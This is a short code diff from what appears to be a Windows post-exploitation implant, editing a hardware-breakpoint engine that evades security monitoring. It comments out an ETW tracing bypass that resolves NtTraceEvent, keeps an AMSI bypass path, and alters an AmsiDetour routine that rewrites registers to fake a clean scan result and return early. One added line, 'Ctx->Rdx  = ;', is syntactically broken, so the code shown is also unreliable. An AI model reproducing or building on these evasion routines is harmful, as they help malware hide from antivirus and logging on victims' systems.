@@ -409,12 +409,12 @@ auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
 
     if ( this->DotnetBypass ) {
 
-        if ( this->DotnetBypass == KH_BYPASS_ETW || this->DotnetBypass == KH_BYPASS_ALL ) {
-            if ( !this->Etw.NtTraceEvent ) {
-                this->Etw.NtTraceEvent = (UPTR)LdrLoad::Api<UPTR>( Self->Ntdll.Handle, Hsh::Str( "NtTraceEvent" ) );
-                KhDbg("NtTraceEvent %p %X", this->Etw.NtTraceEvent, this->Etw.NtTraceEvent );
-            }
-        }
+        // if ( this->DotnetBypass == KH_BYPASS_ETW || this->DotnetBypass == KH_BYPASS_ALL ) {
+        //     if ( !this->Etw.NtTraceEvent ) {
+        //         this->Etw.NtTraceEvent = (UPTR)LdrLoad::Api<UPTR>( Self->Ntdll.Handle, Hsh::Str( "NtTraceEvent" ) );
+        //         KhDbg("NtTraceEvent %p %X", this->Etw.NtTraceEvent, this->Etw.NtTraceEvent );
+        //     }
+        // }
 
         if ( this->DotnetBypass == KH_BYPASS_AMSI || this->DotnetBypass == KH_BYPASS_ALL ) {
             if ( !this->Amsi.Handle ) {
@@ -448,7 +448,7 @@ auto DECLFN HwbpEng::AmsiDetour(
     _In_ PCONTEXT Ctx
 ) -> VOID {
     UPTR Return = *(UPTR*)Ctx->Rsp;
-    Ctx->R8   = 10;
+    Ctx->Rdx  = ;
     Ctx->Rip  = Return;
     Ctx->Rsp += sizeof( PVOID );
 }
